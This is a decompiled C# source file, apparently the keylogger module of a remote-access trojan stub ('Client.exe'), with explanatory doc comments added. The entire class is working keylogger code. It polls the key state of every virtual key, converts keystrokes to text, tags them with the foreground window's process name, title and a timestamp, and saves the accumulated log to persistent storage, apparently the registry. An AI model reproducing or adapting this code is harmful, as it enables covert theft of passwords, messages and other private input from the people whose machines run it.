// Decompiled with JetBrains decompiler
// Type: j.kl
// Assembly: Stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 292CE86C-33B7-4D1B-9DE2-B41CEB9702D8
// Assembly location: C:\Users\User\Desktop\Client.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

/**
 * @file kl.cs
 * @brief Implements keylogging functionality.
 *
 * This class captures keystrokes, records active window changes, and stores the log data.
 * It uses various Windows API calls to convert key codes to their Unicode representation
 * and to detect the current foreground window.
 */

#nullable disable
namespace j
{
  public class kl
  {
    // Stores the title of the last active window.

    private string LastAS;
    // Stores the handle (as integer) of the last active window.

    private int LastAV;
    // The last key recorded.

    private Keys lastKey;
    // Log of captured keystrokes.

    public string Logs;
    // Identifier used for storing/retrieving the log (e.g. registry key name).

    public string vn;
    /**
     * @brief Constructor for the keylogger.
     *
     * Initializes internal variables:
     * - Sets the last key to "None".
     * - Initializes the log as an empty string.
     * - Sets the identifier (vn) to a default value.
     */

    public kl()
    {
      this.lastKey = Keys.None;
      this.Logs = "";
      this.vn = "[kl]";
    }
    /**
     * @brief Retrieves and formats active window information.
     *
     * This method checks the current foreground window. If the window has changed
     * (by comparing its handle and title with stored values), it updates the stored
     * values and returns a formatted string that includes a timestamp, the process name,
     * and the window title. Otherwise, it returns an empty string.
     *
     * @return A formatted string containing active window details or an empty string.
     */
    private string AV()
    {
      try
      {
        // Get the handle of the current foreground window.

        IntPtr foregroundWindow = OK.GetForegroundWindow();
        int b;
        // Retrieve the process ID for the window.

        kl.GetWindowThreadProcessId(foregroundWindow, ref b);
        Process processById = Process.GetProcessById(b);
        // If the window has changed or its title is non-empty, update and return info.

        if (!(foregroundWindow.ToInt32() == this.LastAV & Operators.CompareString(this.LastAS, processById.MainWindowTitle, false) == 0 | processById.MainWindowTitle.Length == 0))
        {
          this.LastAV = foregroundWindow.ToInt32();
          this.LastAS = processById.MainWindowTitle;
          return "\r\n\u0001" + DateAndTime.Now.ToString("yy/MM/dd ") + processById.ProcessName + " " + this.LastAS + "\u0001\r\n";
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return "";
    }
    /**
     * @brief Converts a key code to its string representation.
     *
     * This method determines how to represent a given key (of type Keys) as a string.
     * It handles special keys such as Back, Tab, Return, Space, etc., and uses the
     * VKCodeToUnicode() helper to obtain the Unicode character when appropriate.
     *
     * @param k The key code to be converted.
     * @return A string representing the key press.
     */
    private string Fix(Keys k)
    {
      // Determine if the Shift key is down, taking CapsLock into account.

      bool flag = OK.F.Keyboard.ShiftKeyDown;
      if (OK.F.Keyboard.CapsLock)
        flag = !flag;
      string str1;
      string str2;
      try
      {
        Keys keys = k;
        if (keys <= Keys.End)
        {
          if (keys <= Keys.Return)
          {
            if (keys != Keys.Back)
            {
              if (keys != Keys.Tab)
              {
                if (keys == Keys.Return)
                {
                  // Represent Enter key only if not already appended.

                  str1 = !this.Logs.EndsWith("[ENTER]\r\n") ? "[ENTER]\r\n" : "";
                  goto label_28;
                }
                else
                  goto label_21;
              }
              else
              {
                str1 = "[TAP]\r\n";
                goto label_28;
              }
            }
          }
          else if ((uint)(keys - 16) > 1U)
          {
            if (keys != Keys.Space)
            {
              if (keys == Keys.End)
                goto label_17;
              else
                goto label_21;
            }
            else
            {
              str1 = " ";
              goto label_28;
            }
          }
          else
            goto label_17;
        }
        else if (keys <= Keys.RControlKey)
        {
          if (keys != Keys.Delete)
          {
            if ((uint)(keys - 112) > 11U)
            {
              switch (keys)
              {
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                  goto label_17;
                default:
                  goto label_21;
              }
            }
            else
              goto label_17;
          }
        }
        else if (keys == Keys.Shift || keys == Keys.Control || keys == Keys.Alt)
          goto label_17;
        else
          goto label_21;
        str1 = "[" + k.ToString() + "]";
        goto label_28;
      label_17:
        str1 = "";
        goto label_28;
      label_21:
        if (flag)
        {
          // Convert key code to Unicode and force uppercase.

          str1 = kl.VKCodeToUnicode(checked((uint)k)).ToUpper();
          goto label_28;
        }
        else
          str2 = kl.VKCodeToUnicode(checked((uint)k));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          string upper = Strings.ChrW((int)k).ToString().ToUpper();
          ProjectData.ClearProjectError();
          str1 = upper;
          ProjectData.ClearProjectError();
          goto label_28;
        }
        else
        {
          str2 = Strings.ChrW((int)k).ToString().ToLower();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      str1 = str2;
    label_28:
      return str1;
    }


    // Import Windows API functions for key state and layout.

    /**
     * @brief Retrieves the asynchronous key state.
     *
     * @param a Virtual key code.
     * @return The key state as a short.
     */

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetAsyncKeyState(int a);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]

    /**
 * @brief Retrieves the current keyboard layout for a thread.
 *
 * @param a Thread identifier.
 * @return The input locale identifier for the thread.
 */
    private static extern int GetKeyboardLayout(int a);

    /**
 * @brief Retrieves the current state of all keyboard keys.
 *
 * @param a An array of bytes that receives the keyboard state.
 * @return True if successful; otherwise false.
 */

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] a);

    /**
 * @brief Retrieves the thread and process identifier for the specified window.
 *
 * @param a Handle to the window.
 * @param b Reference to an integer that receives the process identifier.
 * @return The identifier of the thread that created the window.
 */

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

    /**
     * @brief Translates a virtual-key code into a scan code.
     *
     * @param a Virtual key code.
     * @param b Translation parameter.
     * @return The scan code.
     */
    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint a, uint b);


    /**
     * @brief Translates a virtual-key code and keyboard state to the corresponding Unicode character.
     *
     * @param a Virtual key code.
     * @param b Scan code.
     * @param c Array containing the current keyboard state.
     * @param d StringBuilder to receive the resulting Unicode character(s).
     * @param e Size of the buffer.
     * @param f Flags.
     * @param g Handle to the keyboard layout.
     * @return The number of characters written.
     */
    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
      uint a,
      uint b,
      byte[] c,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder d,
      int e,
      uint f,
      IntPtr g);

    /**
     * @brief Converts a virtual key code to its Unicode string representation.
     *
     * This helper function obtains the current keyboard state, maps the virtual key to a scan code,
     * and uses the ToUnicodeEx API to get the corresponding Unicode character.
     *
     * @param a The virtual key code.
     * @return The Unicode string corresponding to the key.
     */
    private static string VKCodeToUnicode(uint a)
    {
      try
      {
        StringBuilder d = new StringBuilder();
        byte[] numArray = new byte[(int)byte.MaxValue];
        if (!kl.GetKeyboardState(numArray))
          return "";
        uint b1 = kl.MapVirtualKey(a, 0U);
        int b2 = 0;
        // Get the keyboard layout for the thread owning the foreground window.

        IntPtr keyboardLayout = (IntPtr)kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(OK.GetForegroundWindow(), ref b2));
        kl.ToUnicodeEx(a, b1, numArray, d, 5, 0U, keyboardLayout);
        return d.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      // Fallback: return the key code as a string.

      return ((Keys)checked((int)a)).ToString();
    }
    /**
     * @brief Starts the keylogging process.
     *
     * This method continuously scans all virtual key codes (0 to 255) using GetAsyncKeyState.
     * When a key is detected (and Control is not pressed), it converts the key code to a string
     * representation (using Fix()) and appends it to the log. It also captures active window changes
     * via AV() and periodically stores the log via OK.STV.
     */
    public void WRK()
    {
      // Retrieve stored logs from persistent storage.

      this.Logs = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV(this.vn, (object)"")));
      try
      {
        int num1 = 0;
        while (true)
        {
          checked { ++num1; }
          int a = 0;
          do
          {
            // Check if key 'a' was just pressed (state equals -32767) and Ctrl is not down.

            if (kl.GetAsyncKeyState(a) == (short)-32767 & !OK.F.Keyboard.CtrlKeyDown)
            {
              Keys k = (Keys)a;
              // Convert the key to a readable string.

              string str = this.Fix(k);
              if (str.Length > 0)
              {
                // If an active window change is detected, append the window info.

                this.Logs += this.AV();
                this.Logs += str;
              }
              // Update the last key pressed.

              this.lastKey = k;
            }
            checked { ++a; }
          }
          while (a <= (int)byte.MaxValue);
          // Every 1000 iterations, trim and persist the log if it exceeds a size threshold.

          if (num1 == 1000)
          {
            num1 = 0;
            int num2 = checked(Conversions.ToInteger("20") * 1024);
            if (this.Logs.Length > num2)
              this.Logs = this.Logs.Remove(0, checked(this.Logs.Length - num2));                        // Save the log to persistent storage (e.g., registry) using OK.STV.
                                                                                                        // Save the log to persistent storage (e.g., registry) using OK.STV.

            OK.STV(this.vn, (object)this.Logs, RegistryValueKind.String);
          }
          // Short delay to reduce CPU usage.

          Thread.Sleep(1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
  }
}
